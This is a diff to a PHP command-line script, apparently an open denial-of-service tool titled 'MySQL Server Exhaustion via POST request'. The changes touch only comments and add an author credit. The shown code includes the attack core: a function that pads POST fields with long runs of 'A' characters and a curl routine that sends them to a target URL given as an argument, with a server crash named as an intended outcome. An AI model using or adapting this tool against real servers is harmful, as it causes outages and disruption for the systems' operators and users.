@@ -1,9 +1,14 @@
 #!/usr/bin/php
 
 <?php
+/*
 
-// MySQL Server Exhaustion via POST request.
-// Many possible outcomes, such as server-crash, or spitting out unwanted errors.
+MySQL Server Exhaustion via POST request.
+Many possible outcomes, such as server-crash, or spitting out unwanted errors.
+
+Written by Dominik Penner (domepik@gmail.com)
+
+*/
 
 echo "
  _______         __                       __   
@@ -12,13 +17,13 @@ echo "
 |_______||__.__||__|__|___._|_____|_____||____| by DP.\n\n";
 
 
-// Sanitize the POST data being sent to the server.
+# Sanitize the POST data being sent to the server.
 function sanitizePost($postdata, $numchars) {
 	return str_replace("(%)", str_repeat("A", $numchars), $postdata);
 }
 
 
-// Sending the POST request to the server.
+# Sending the POST request to the server.
 function sendPost($target, $postfields) {
 
 	$curl = curl_init($target);
@@ -33,7 +38,7 @@ function sendPost($target, $postfields) {
 }
 
 
-// The main function.
+# The main function.
 if(isset($argv[1], $argv[2], $argv[3])) {
 
 	$target = $argv[1];
